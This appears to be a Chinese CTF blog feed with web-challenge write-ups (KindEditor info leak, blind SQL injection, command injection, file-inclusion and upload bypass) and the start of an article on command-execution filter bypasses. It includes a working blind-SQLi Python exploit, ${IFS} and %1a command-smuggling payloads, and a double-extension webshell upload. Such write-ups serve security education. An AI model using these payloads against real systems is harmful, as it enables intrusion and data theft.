<h1 id="GG"><a href="#GG" class="headerlink" title="GG"></a>GG</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：游戏似乎很无聊啊</div><div class="line"></div><div class="line">http://218.76.35.75:65380/</div></pre></td></tr></table></figure>
<p>访问后查看源代码，有个 tetris.js 。前端游戏这种，往往是在打通关之类的会给一些奇葩的提示或者直接出flag。对代码进行美化后，比如搜索gameover。找到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">this.gameOver = function() &#123;</div><div class="line">	b.stats.stop();</div><div class="line">	b.puzzle.stop();</div><div class="line">	document.getElementById(&quot;tetris-nextpuzzle&quot;).style.display = &quot;none&quot;;</div><div class="line">	document.getElementById(&quot;tetris-gameover&quot;).style.display = &quot;block&quot;;</div><div class="line">	if (this.highscores.mayAdd(this.stats.getScore())) &#123;</div><div class="line">		var e = prompt(&quot;Game Over !\nEnter your name:&quot;, &quot;&quot;);</div><div class="line">		e &amp;&amp; e.trim().length &amp;&amp; this.highscores.add(e, this.stats.getScore())</div><div class="line">	&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>里面有mayAdd，找到一处：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.mayAdd = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</div><div class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.scores.length &lt; <span class="keyword">this</span>.maxscores) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)), !<span class="number">0</span>;</div><div class="line">			<span class="keyword">for</span> (<span class="keyword">var</span> b = <span class="keyword">this</span>.scores.length - <span class="number">1</span>; <span class="number">0</span> &lt;= b; --b) <span class="keyword">if</span> (<span class="keyword">this</span>.scores[b].score &lt; a) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)), !<span class="number">0</span>;</div><div class="line">			<span class="keyword">return</span> !<span class="number">1</span></div><div class="line">		&#125;;</div></pre></td></tr></table></figure></p>
<p><code>&quot;webqwer&quot; [1] + &quot;100.js&quot;</code>，即<code>e100.js</code>。访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:65380/e100.js</div></pre></td></tr></table></figure></p>
<p>出现jsfuck编码，放到f12控制台里运行一下，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oT0yTrjU0xhjhj2YTcT8jljMWpzS9tDk</div></pre></td></tr></table></figure></p>
<h1 id="Reappear"><a href="#Reappear" class="headerlink" title="Reappear"></a>Reappear</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：网管说他安装了什么编辑器，但是似乎不太会用。。。</div><div class="line"></div><div class="line">http://218.76.35.75:65180/</div></pre></td></tr></table></figure>
<p>访问后有提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Kindeditor v4.1.7</div><div class="line">something maybe in /kindeditor/</div></pre></td></tr></table></figure></p>
<p>网上有对应的信息泄露漏洞。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:65180/kindeditor/php/file_manager_json.php</div></pre></td></tr></table></figure></p>
<p>得到如下数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">/var/www/html/Web/kind/kindeditor/attached</div><div class="line">&#123;</div><div class="line">&quot;moveup_dir_path&quot;:&quot;&quot;,</div><div class="line">&quot;current_dir_path&quot;:&quot;&quot;,</div><div class="line">&quot;current_url&quot;:&quot;\/kindeditor\/php\/..\/attached\/&quot;,</div><div class="line">&quot;total_count&quot;:2,</div><div class="line">&quot;file_list&quot;:[</div><div class="line">	&#123;&quot;is_dir&quot;:false,</div><div class="line">	&quot;has_file&quot;:false,</div><div class="line">	&quot;filesize&quot;:51,</div><div class="line">	&quot;dir_path&quot;:&quot;&quot;,</div><div class="line">	&quot;is_photo&quot;:false,</div><div class="line">	&quot;filetype&quot;:&quot;php&quot;,</div><div class="line">	&quot;filename&quot;:&quot;flag_clue.php&quot;,</div><div class="line">	&quot;datetime&quot;:&quot;2015-11-16 21:58:28&quot;</div><div class="line">	&#125;,</div><div class="line">	&#123;&quot;is_dir&quot;:false,</div><div class="line">	&quot;has_file&quot;:false,</div><div class="line">	&quot;filesize&quot;:28,</div><div class="line">	&quot;dir_path&quot;:&quot;&quot;,</div><div class="line">	&quot;is_photo&quot;:false,</div><div class="line">	&quot;filetype&quot;:&quot;html&quot;,</div><div class="line">	&quot;filename&quot;:&quot;index.html&quot;,</div><div class="line">	&quot;datetime&quot;:&quot;2015-11-16 21:37:12&quot;</div><div class="line">	&#125;</div><div class="line">	]</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>里面有个 flag_clue.php 。访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:65180/kindeditor/attached/flag_clue.php</div></pre></td></tr></table></figure></p>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=0nYvpEdhVmcnFUZu9GRlZXd7pzZhxmZ</div></pre></td></tr></table></figure></p>
<p>脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import base64</div><div class="line">key = &quot;=0nYvpEdhVmcnFUZu9GRlZXd7pzZhxmZ&quot;</div><div class="line">print(base64.b64decode(key[::-1]))</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">b&apos;flag:&#123;uveDoneAgreatJob&#125;&apos;</div></pre></td></tr></table></figure></p>
<h1 id="DrinkCoffee"><a href="#DrinkCoffee" class="headerlink" title="DrinkCoffee"></a>DrinkCoffee</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：据说登录可以领到咖啡票，不过不知道密码哦……</div><div class="line"></div><div class="line">http://218.76.35.75:65280/</div></pre></td></tr></table></figure>
<p>访问了之后如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170817/1.png?raw=true" alt=""></p>
<p>需要我们输入一个密码，还有就是ip限制的要求，和来源的要求。</p>
<p>ip可以通过 X-Forwarded-For 伪造。<br>来源 可以通过 Refferer 伪造。</p>
<p>抓包后可以看到头部有密码字段：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170817/2.png?raw=true" alt=""></p>
<p>另外题目在form上加了一层图片，可以用firebug直接把图片去掉，然后就能submit密码了。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170817/3.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">84294deb396ba4373c5ea8b73fa111b2</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这些都是一些很简单的题。另有一些题会单独拿出来写。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup</title>
    <link href="http://yoursite.com/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup/"/>
    <id>http://yoursite.com/2017/08/16/XNUCA-2017-Web专题赛前指导-阳光总在风雨后-writeup/</id>
    <published>2017-08-16T11:11:39.000Z</published>
    <updated>2017-08-18T11:42:35.186Z</updated>
    
    <content type="html"><![CDATA[<p>mysql 盲注</p>
<p>命令执行 ${IFS}绕过<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20130/index.php</div></pre></td></tr></table></figure>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>经过fuzz，一些关键字被过滤了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">or</div><div class="line">for</div><div class="line">union</div><div class="line">空格</div><div class="line">逗号，</div><div class="line">*</div></pre></td></tr></table></figure></p>
<p>一些关键字没有过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">select</div><div class="line">from</div><div class="line">where</div><div class="line">substr</div><div class="line">ascii</div><div class="line">^</div><div class="line">.</div></pre></td></tr></table></figure></p>
<p>无回显，考察盲注。用异或^进行注入。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/6.png?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/7.png?raw=true" alt=""></p>
<p>给出利用脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</div><div class="line">	url = <span class="string">"http://218.76.35.74:20130/login.php"</span></div><div class="line">	headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">	parm = <span class="string">"uname="</span>+payload+<span class="string">"&amp;passwd=admin"</span></div><div class="line">	content = requests.post(url,data=parm,headers=headers,proxies=proxy)</div><div class="line">	<span class="keyword">return</span> content.text</div><div class="line"></div><div class="line">usernameerr = <span class="string">"username error!!"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateTarget</span><span class="params">(flag)</span>:</span></div><div class="line">	<span class="keyword">if</span> flag == <span class="string">"database"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"database()"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"passwd"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT(passwd)from(admin))"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,target)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		payload = <span class="string">"admin'^(select(ascii(mid(("</span>+generateTarget(target) +<span class="string">")from("</span>+ str(i) +<span class="string">"))))&lt;="</span>+str(midNum) +<span class="string">")='0"</span></div><div class="line"></div><div class="line">		recv = sendPayload(payload)</div><div class="line"></div><div class="line">		<span class="keyword">if</span> usernameerr <span class="keyword">in</span> recv:</div><div class="line"></div><div class="line">			doubleSearch(midNum,rightNum,i,target)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line"></div><div class="line">			doubleSearch(leftNum,midNum,i,target)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line"></div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line"></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The passwd:"</span></div><div class="line">	target = <span class="string">"passwd"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
<p>获得密码的Md5值为：50f87a3a3ad48e26a5d9058418fb78b5<br>解密后为： shuangshuang</p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>登陆后有一个命令执行的地方，但是过滤了空格，而且仅仅回显出结果的最后一条。<br>参考：<a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="external">浅谈CTF中命令执行与绕过的小技巧</a>，空格可以利用${IFS}替代。<br>而回显可以利用head来选择。</p>
<p>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls$&#123;IFS&#125;/var/www/html|head$&#123;IFS&#125;-n$&#123;IFS&#125;1</div></pre></td></tr></table></figure></p>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">9ef89ad913e848b64b73e3aa721e44e4</div></pre></td></tr></table></figure></p>
<p>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls$&#123;IFS&#125;/var/www/html/9ef89ad913e848b64b73e3aa721e44e4/</div></pre></td></tr></table></figure></p>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">this_pag0_is_F1a9.php</div></pre></td></tr></table></figure></p>
<p>输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat$&#123;IFS&#125;/var/www/html/9ef89ad913e848b64b73e3aa721e44e4/*</div></pre></td></tr></table></figure></p>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;sQ1_1NJEct_coMMond_eXEC&#125;</div></pre></td></tr></table></figure></p>
<p>或者直接访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20130/9ef89ad913e848b64b73e3aa721e44e4/this_pag0_is_F1a9.php</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mysql 盲注&lt;/p&gt;
&lt;p&gt;命令执行 ${IFS}绕过&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XNUCA 2017-Web专题赛前指导-Document-writeup</title>
    <link href="http://yoursite.com/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/"/>
    <id>http://yoursite.com/2017/08/16/XNUCA-2017-Web专题赛前指导-Document-writeup/</id>
    <published>2017-08-16T11:10:23.000Z</published>
    <updated>2017-08-18T11:46:49.778Z</updated>
    
    <content type="html"><![CDATA[<p>php伪协议 文件读取  文件上传绕过  apache解析漏洞<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>查看源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=&quot;en&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">    &lt;title&gt;Document&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;!-- include.php --&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>发现有include.php，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/include.php</div></pre></td></tr></table></figure></p>
<p>提示 the parameter is file! :) 。同时查看源代码有upload.php，是个上传页面。</p>
<p>利用php伪协议读取源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/include.php?file=php://filter/read=convert.base64-encode/resource=include</div></pre></td></tr></table></figure></p>
<p>include.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">Tips: the parameter is file! :)</div><div class="line">&lt;!-- upload.php --&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    @$file = $_GET[<span class="string">"file"</span>];</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">include</span>($file.<span class="string">'.php'</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>读取upload源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/include.php?file=php://filter/read=convert.base64-encode/resource=upload</div></pre></td></tr></table></figure></p>
<p>upload.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">""</span> enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span></div><div class="line">name=<span class="string">"upload"</span>&gt;file:&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;&lt;br&gt;</div><div class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload"</span> /&gt;&lt;/form&gt;</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>];</div><div class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</div><div class="line">    @$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">    $extension = end($temp);</div><div class="line">    <span class="keyword">if</span> (((@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">    || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</div><div class="line">    || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</div><div class="line">    &amp;&amp; (@$_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">102400</span>) &amp;&amp; in_array($extension, $allowedExts))</div><div class="line">    &#123;</div><div class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">        <span class="keyword">echo</span> <span class="string">"file upload successful!Save in:  "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"upload failed!"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>随手上传了一个 god4.php.jpg</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/3.png?raw=true" alt=""></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/upload/god4.php.jpg</div></pre></td></tr></table></figure></p>
<p>被解析了，应该是因为apache的缘故，不识别jpg，然后向前递归解析了php。既然能解析，那就用菜刀连上去：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/4.png?raw=true" alt=""></p>
<p>在虚拟终端中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find / | grep flag</div></pre></td></tr></table></figure></p>
<p>然后发现有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/.sshkey/flag.txt</div></pre></td></tr></table></figure></p>
<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[/var/www/html/upload/]$ cat /etc/.sshkey/flag.txt</div><div class="line">7F5A58DFC54CFAC9903FE85D92703787</div></pre></td></tr></table></figure></p>
<p>这题也有多种解法，因为在include.php中可以发现，没有对zip或者phar协议等进行过滤，可以利用这些协议进行直接的文件包含。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php伪协议 文件读取  文件上传绕过  apache解析漏洞&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>命令执行的一些绕过技巧</title>
    <link href="http://yoursite.com/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2017/08/15/命令执行的一些绕过技巧/</id>
    <published>2017-08-15T11:05:33.000Z</published>
    <updated>2017-08-18T11:49:18.603Z</updated>
    
    <content type="html"><![CDATA[<p>命令执行的一些绕过技巧<br>已收录至: <a href="https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html" target="_blank" rel="external">WAF-Bypass</a><br><a id="more"></a></p>
<h1 id="多条命令"><a href="#多条命令" class="headerlink" title="多条命令"></a>多条命令</h1><h2 id="法一：-逻辑运算符"><a href="#法一：-逻辑运算符" class="headerlink" title="法一： 逻辑运算符"></a>法一： 逻辑运算符</h2><h1 id="绕过escapeshellcmd"><a href="#绕过escapeshellcmd" class="headerlink" title="绕过escapeshellcmd"></a>绕过escapeshellcmd</h1><h2 id="法一：win下执行bat"><a href="#法一：win下执行bat" class="headerlink" title="法一：win下执行bat"></a>法一：win下执行bat</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$command = <span class="string">'dir '</span>.$_POST[<span class="string">'dir'</span>];</div><div class="line">$escaped_command = escapeshellcmd($command);</div><div class="line">var_dump($escaped_command);</div><div class="line">file_put_contents(<span class="string">'out.bat'</span>,$escaped_command);</div><div class="line">system(<span class="string">'out.bat'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dir=../ %1a whoami</div></pre></td></tr></table></figure></p>
